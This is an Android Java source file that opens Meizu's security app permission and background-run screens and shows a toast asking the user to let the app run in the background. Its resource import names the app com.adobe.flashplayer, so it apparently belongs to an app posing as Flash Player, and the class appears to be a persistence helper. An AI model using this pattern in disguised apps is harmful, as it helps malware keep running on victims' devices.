package com.setup;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import com.adobe.flashplayer.R;
import com.utils.PublicFunction;

public class Meizu {
	public static void authority(Context context){
    	if (PublicFunction.isAppWorking(context, "com.meizu.safe")) {

    		try{
        		//Intent intent = new Intent("com.meizu.safe.security.SHOW_APPSEC"); 
        		//intent.addCategory(Intent.CATEGORY_DEFAULT); 
        		//intent.putExtra("packageName", BuildConfig.APPLICATION_ID); 
        		//context.startActivity(intent);
        		
        		Intent intent = new Intent("android.intent.action.MAIN"); 
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
        		ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.AppPermissionActivity");
        		//ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.ApplicationActivity"); 
        		//ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity"); 
        		//ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.security.AppSecActivity"); 
        		intent.setComponent(cn); 
        		context.startActivity(intent);
    		}catch(Exception ex){
    			try{
	        		Intent intent = new Intent("android.intent.action.MAIN"); 
	        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
	        		ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity"); 
	        		//ComponentName comp = new ComponentName("com.meizu.safe", "com.meizu.safe.security.HomeActivity"); 
	        		intent.setComponent(comp); 
	        		context.startActivity(intent);
    			}catch(Exception e){
    				e.printStackTrace();
    			}
    		}
    	}
    	else{
    		SetupAuthority.defaultSettings(context);
    	}
	}
	
	
	public static void bootup(Context context){
		Toast.makeText(context, "请允许\"" + context.getString(R.string.app_name) +"\"后台运行",Toast.LENGTH_LONG).show();
    	if (PublicFunction.isAppWorking(context, "com.meizu.safe")) {
    		try{
        		//context.startActivity(getPackageManager().getLaunchIntentForPackage("com.meizu.safe"));
	        	Intent intent = new Intent();
	        	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        	
	        	ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.SmartBGActivity");
	        	
	        	
	        	//com.meizu.safe.permission.AutoRunActivity
    			//ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity");
    			intent.setComponent(cn);
    			context.startActivity(intent);
    		}catch(Exception ex){
    			try{
		        	Intent intent = new Intent();
		        	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        			//ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.security.HomeActivity");
        			ComponentName cn = new ComponentName("com.meizu.safe", "com.meizu.safe.permission.PermissionMainActivity"); 
        			intent.setComponent(cn);
        			context.startActivity(intent);
    			}catch(Exception e){
    				e.printStackTrace();
    			}
    		}
    	}
    	else{
    		SetupAuthority.defaultSettings(context);
    	}
	}
}
